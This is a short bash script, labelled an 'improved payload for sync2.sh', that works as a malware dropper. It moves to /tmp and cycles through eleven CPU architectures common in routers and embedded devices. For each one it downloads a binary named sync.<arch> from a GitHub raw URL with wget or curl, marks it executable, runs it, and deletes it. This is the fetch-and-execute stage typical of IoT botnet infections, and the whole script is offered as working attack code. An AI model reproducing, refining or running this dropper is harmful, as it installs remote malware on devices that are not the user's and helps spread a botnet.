#!/bin/bash
# Improved payload for sync2.sh

# Base URL for payloads
BASE_URL="https://raw.githubusercontent.com/khaosbrigade1337-hue/gd3523eas/refs/heads/main"

# List of architectures to download
ARCHS="x86 x86_64 mips mipsel arm4 arm5 arm6 arm7 powerpc m68k sh4"

# Function to download and execute for a given architecture
fetch_and_run() {
    ARCH=$1
    echo "--- Processing architecture: $ARCH ---"
    
    # Download using wget or curl
    wget -O "sync.$ARCH" "$BASE_URL/sync.$ARCH" || curl -o "sync.$ARCH" "$BASE_URL/sync.$ARCH"
    
    # Check if download was successful
    if [ -f "sync.$ARCH" ]; then
        echo "Downloaded sync.$ARCH successfully."
        # Rename, make executable, and run with the specified argument
        cat "sync.$ARCH" > sync
        chmod +x sync
        ./sync x86new
        # Clean up before next attempt
        rm -f sync "sync.$ARCH"
        echo "Execution attempt for $ARCH finished."
        # Exit after the first successful execution
        exit 0
    else
        echo "Failed to download sync.$ARCH."
    fi
}

# Change to a writable directory
cd /tmp || exit 1

# Loop through each architecture and try to execute
for arch in $ARCHS; do
    fetch_and_run "$arch"
done

echo "--- All architectures attempted. ---"
